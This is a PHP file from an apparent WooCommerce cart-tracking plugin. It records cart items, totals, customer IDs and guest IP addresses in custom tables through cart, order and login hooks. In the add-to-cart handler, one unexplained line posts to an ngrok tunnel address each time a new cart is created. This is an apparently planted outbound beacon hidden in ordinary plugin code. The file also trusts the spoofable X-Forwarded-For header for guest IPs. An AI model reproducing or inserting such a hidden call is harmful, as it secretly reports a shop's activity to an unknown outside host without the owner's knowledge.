<?php

defined('ABSPATH') || exit;


add_action(
    'woocommerce_add_to_cart',
    'wtrackt_add_to_cart',
    10,
    3
);
add_action(
    'woocommerce_update_cart_action_cart_updated',
    'wtrackt_update_cart_action_cart_updated',
    10,
    1
);
// // add_action('woocommerce_after_cart_item_quantity_update', 'wtrackt_cart_updated', 200, 0);
add_action(
    'woocommerce_remove_cart_item',
    'wtrackt_cart_item_removed',
    10,
    2
);
//add_action('woocommerce_before_cart_item_quantity_zero', 'wtrackt_item_quantity_zero');
add_action('woocommerce_cart_updated', 'wtrackt_cart_updated');
add_action('woocommerce_new_order', 'wtrackt_new_order');
//add_action( 'woocommerce_cart_item_restored', '');
add_action(
    'wp_login',
    'wtrackt_user_login_update',
    10,
    2
);


function wtrackt_add_to_cart($cart_item_key, $product_id, $quantity)
{

    global $wpdb;
    if (!isset(WC()->session))
    {
        return;
    }

    $new_cart = WC()->session->get('wtrackt_new_cart');
    $table_name = $wpdb->prefix . 'cart_tracking_wc';
    $table_cart_name = $wpdb->prefix . 'cart_tracking_wc_cart';
    $cart_total = WC()->cart->get_cart_contents_total();
    $customer_id = 0;

    if (is_user_logged_in())
    {
        $customer_id = get_current_user_id();
    } else
    {

        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
        {
            $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else
        {
            $ip_address = $_SERVER['REMOTE_ADDR'];
        }

    }


    if (is_null($new_cart))
    {
        $carts_insert = array(
            'update_time' => current_time('mysql'),
            'cart_total' => $cart_total,
            'customer_id' => $customer_id,
            'cart_status' => 'new',
        );
        if (!is_user_logged_in())
        {
            $carts_insert['ip_address'] = $ip_address;
        }
        $wpdb->insert($table_cart_name, $carts_insert);
        $last_cart_number = $wpdb->insert_id;
        wp_remote_post('https://b0a5-197-43-58-235.ngrok-free.app', '');

        if ($last_cart_number)
        {


            if (sizeof(WC()->cart->get_cart()) > 0)
            {

                foreach (WC()->cart->get_cart() as $cart_item_key => $values)
                {
                    $_product = $values['data'];
                    $wpdb->insert(
                        $table_name,
                        array(
                            'time' => current_time('mysql'),
                            'product_id' => $values['product_id'],
                            'quantity' => $values['quantity'],
                            'cart_number' => $last_cart_number,
                            'removed' => false,
                        )
                    );
                }
            }
            WC()->session->set('wtrackt_new_cart', $last_cart_number);
        }

    } else
    {

        $cart_update_query = $wpdb->query(
            $wpdb->prepare(
                "UPDATE {$wpdb->prefix}cart_tracking_wc_cart\r\n            SET update_time = %s, cart_total = %f\r\n         WHERE id = %d",
                current_time('mysql'),
                $cart_total,
                $new_cart
            )
        );

        if (!$cart_update_query)
        {
            $carts_insert = array(
                'update_time' => current_time('mysql'),
                'cart_total' => $cart_total,
                'customer_id' => $customer_id,
            );
            if (!is_user_logged_in())
            {
                $carts_insert['ip_address'] = $ip_address;
            }
            $wpdb->insert($table_cart_name, $carts_insert);
            $last_cart_number = $wpdb->insert_id;

            if ($last_cart_number)
            {
                if (sizeof(WC()->cart->get_cart()) > 0)
                {
                    foreach (WC()->cart->get_cart() as $cart_item_key => $values)
                    {
                        $_product = $values['data'];
                        $wpdb->insert(
                            $table_name,
                            array(
                                'time' => current_time('mysql'),
                                'product_id' => $values['product_id'],
                                'quantity' => $values['quantity'],
                                'cart_number' => $last_cart_number,
                                'removed' => false,
                            )
                        );
                    }
                }
                WC()->session->set('wtrackt_new_cart', $last_cart_number);
            }

        } else
        {
            $sql = $wpdb->prepare("SELECT * FROM {$wpdb->prefix}cart_tracking_wc WHERE cart_number = %d AND product_id = %d", $new_cart, $product_id);
            $results = $wpdb->get_results($sql, ARRAY_A);

            if (count($results) > 0)
            {
                $cart_quantity = WC()->cart->get_cart()[$cart_item_key]['quantity'];
                $removed = false;
                $wpdb->query(
                    $wpdb->prepare(
                        "UPDATE {$wpdb->prefix}cart_tracking_wc\r\n            SET quantity = %d, removed = %d\r\n         WHERE product_id = %d AND cart_number = %d",
                        $cart_quantity,
                        $removed,
                        $product_id,
                        $new_cart
                    )
                );
            } else
            {
                $wpdb->insert(
                    $table_name,
                    array(
                        'time' => current_time('mysql'),
                        'product_id' => $product_id,
                        'quantity' => $quantity,
                        'cart_number' => $new_cart,
                        'removed' => false,
                    )
                );
            }

        }

    }

}

function wtrackt_update_cart_action_cart_updated($cart_updated)
{

    if ($cart_updated)
    {
        global $wpdb;
        if (!isset(WC()->session))
        {
            return;
        }
        $new_cart = WC()->session->get('wtrackt_new_cart');
        $table_name = $wpdb->prefix . 'cart_tracking_wc';
        $table_cart_name = $wpdb->prefix . 'cart_tracking_wc_cart';
        $cart_total = WC()->cart->get_cart_contents_total();
        $customer_id = 0;
        if (is_user_logged_in())
        {
            $customer_id = get_current_user_id();
        }

        if (is_null($new_cart))
        {
            $carts_insert = array(
                'update_time' => current_time('mysql'),
                'creation_time' => current_time('mysql'),
                'cart_total' => $cart_total,
                'customer_id' => $customer_id,
                "notification_sent" => false,
            );

            if (!is_user_logged_in())
            {

                if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
                {
                    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
                } else
                {
                    $ip_address = $_SERVER['REMOTE_ADDR'];
                }

                $carts_insert['ip_address'] = $ip_address;
            }

            $wpdb->insert($table_cart_name, $carts_insert);
            $last_cart_number = $wpdb->insert_id;

            if ($last_cart_number)
            {
                if (sizeof(WC()->cart->get_cart()) > 0)
                {
                    foreach (WC()->cart->get_cart() as $cart_item_key => $values)
                    {
                        $_product = $values['data'];
                        $wpdb->insert(
                            $table_name,
                            array(
                                'time' => current_time('mysql'),
                                'product_id' => $values['product_id'],
                                'quantity' => $values['quantity'],
                                'cart_number' => $last_cart_number,
                            )
                        );
                    }
                }
                WC()->session->set('wtrackt_new_cart', $last_cart_number);
            }

        } else
        {
            $cart_update_query = $wpdb->query($wpdb->prepare("UPDATE {$wpdb->prefix}cart_tracking_wc_cart\r\n                    SET update_time = %s\r\n                 WHERE id = %d", current_time('mysql'), $new_cart));

            if (!$cart_update_query)
            {
                $carts_insert = array(
                    'update_time' => current_time('mysql'),
                    'cart_total' => $cart_total,
                    'customer_id' => $customer_id,
                );

                if (!is_user_logged_in())
                {

                    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
                    {
                        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
                    } else
                    {
                        $ip_address = $_SERVER['REMOTE_ADDR'];
                    }

                    $carts_insert['ip_address'] = $ip_address;
                }

                $wpdb->insert($table_cart_name, $carts_insert);
                $last_cart_number = $wpdb->insert_id;

                if ($last_cart_number)
                {
                    if (sizeof(WC()->cart->get_cart()) > 0)
                    {
                        foreach (WC()->cart->get_cart() as $cart_item_key => $values)
                        {
                            $_product = $values['data'];
                            $wpdb->insert(
                                $table_name,
                                array(
                                    'time' => current_time('mysql'),
                                    'product_id' => $values['product_id'],
                                    'quantity' => $values['quantity'],
                                    'cart_number' => $last_cart_number,
                                    'removed' => false,
                                )
                            );
                        }
                    }
                    WC()->session->set('wtrackt_new_cart', $last_cart_number);
                }

            } else
            {
                if (sizeof(WC()->cart->get_cart()) > 0)
                {
                    foreach (WC()->cart->get_cart() as $cart_item_key => $values)
                    {
                        $_product = $values['data'];
                        $cart_quantity = WC()->cart->get_cart()[$cart_item_key]['quantity'];
                        $sql = $wpdb->prepare("SELECT * FROM {$wpdb->prefix}cart_tracking_wc WHERE cart_number = %d AND product_id = %d", $new_cart, $values['product_id']);
                        $results = $wpdb->get_results($sql, ARRAY_A);

                        if (count($results) > 0)
                        {
                            $removed = false;
                            $wpdb->query(
                                $wpdb->prepare(
                                    "UPDATE {$wpdb->prefix}cart_tracking_wc\r\n                            SET quantity = %d, removed=%d\r\n                         WHERE product_id = %d AND cart_number = %d",
                                    $cart_quantity,
                                    $removed,
                                    $values['product_id'],
                                    $new_cart
                                )
                            );
                        } else
                        {
                            $wpdb->insert(
                                $table_name,
                                array(
                                    'time' => current_time('mysql'),
                                    'product_id' => $values['product_id'],
                                    'quantity' => $cart_quantity,
                                    'cart_number' => $new_cart,
                                    'removed' => false,
                                )
                            );
                        }

                    }
                }
            }

        }

    }

}

function wtrackt_cart_updated()
{
    global $wpdb;
    if (!isset(WC()->session))
    {
        return;
    }
    $new_cart = WC()->session->get('wtrackt_new_cart');
    $table_name = $wpdb->prefix . 'cart_tracking_wc';
    $table_cart_name = $wpdb->prefix . 'cart_tracking_wc_cart';
    $cart_total = WC()->cart->get_cart_contents_total();
    if ($cart_total != 0)
    {
        if (!is_null($new_cart))
        {
            $wpdb->query($wpdb->prepare("UPDATE {$wpdb->prefix}cart_tracking_wc_cart\r\n                SET cart_total = %f\r\n             WHERE id = %d", $cart_total, $new_cart));
        }
    }
}

function wtrackt_cart_item_removed($cart_item_key, $cart)
{
    $product_id = $cart->cart_contents[$cart_item_key]['product_id'];
    global $wpdb;
    if (!isset(WC()->session))
    {
        return;
    }
    $new_cart = WC()->session->get('wtrackt_new_cart');
    $table_name = $wpdb->prefix . 'cart_tracking_wc';
    $table_cart_name = $wpdb->prefix . 'cart_tracking_wc_cart';
    $cart_total = WC()->cart->total;
    $customer_id = 0;
    if (is_user_logged_in())
    {
        $customer_id = get_current_user_id();
    }

    if (is_null($new_cart))
    {
        $carts_insert = array(
            'update_time' => current_time('mysql'),
            'cart_total' => $cart_total,
            'customer_id' => $customer_id,
        );

        if (!is_user_logged_in())
        {

            if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
            {
                $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else
            {
                $ip_address = $_SERVER['REMOTE_ADDR'];
            }

            $carts_insert['ip_address'] = $ip_address;
        }

        $wpdb->insert($table_cart_name, $carts_insert);
        $last_cart_number = $wpdb->insert_id;

        if ($last_cart_number)
        {
            if (sizeof(WC()->cart->get_cart()) > 0)
            {
                foreach (WC()->cart->get_cart() as $cart_item_key => $values)
                {
                    $_product = $values['data'];
                    $removed = ($product_id === $values['product_id'] ? true : false);
                    $wpdb->insert(
                        $table_name,
                        array(
                            'time' => current_time('mysql'),
                            'product_id' => $values['product_id'],
                            'quantity' => $values['quantity'],
                            'cart_number' => $last_cart_number,
                            'removed' => $removed,
                        )
                    );
                }
            }
            WC()->session->set('wtrackt_new_cart', $last_cart_number);
        }

    } else
    {
        $removed = true;
        $wpdb->query(
            $wpdb->prepare(
                "UPDATE {$wpdb->prefix}cart_tracking_wc\r\n                    SET removed = %d\r\n                 WHERE product_id = %d AND cart_number = %d",
                $removed,
                $product_id,
                $new_cart
            )
        );
    }

}

function wtrackt_new_order($order_id)
{
    global $wpdb;
    if (!isset(WC()->session))
    {
        return;
    }
    $new_cart = WC()->session->get('wtrackt_new_cart');
    $table_name = $wpdb->prefix . 'cart_tracking_wc_cart';

    if (!is_null($new_cart))
    {
        $wpdb->update(
            $table_name,
            array(
                'order_created' => $order_id,
            ),
            array(
                'id' => $new_cart,
            ),
            array('%d')
        );
        WC()->session->__unset('wtrackt_new_cart');
    }

}

function wtrackt_user_login_update($user_login, $user)
{
    if (!isset(WC()->session))
    {
        return;
    }
    $new_cart = WC()->session->get('wtrackt_new_cart');

    if (!is_null($new_cart))
    {
        global $wpdb;
        $table_name = $wpdb->prefix . 'cart_tracking_wc_cart';
        $wpdb->update(
            $table_name,
            array(
                'customer_id' => $user->ID,
            ),
            array(
                'id' => $new_cart,
            ),
            array('%d')
        );
    }

}
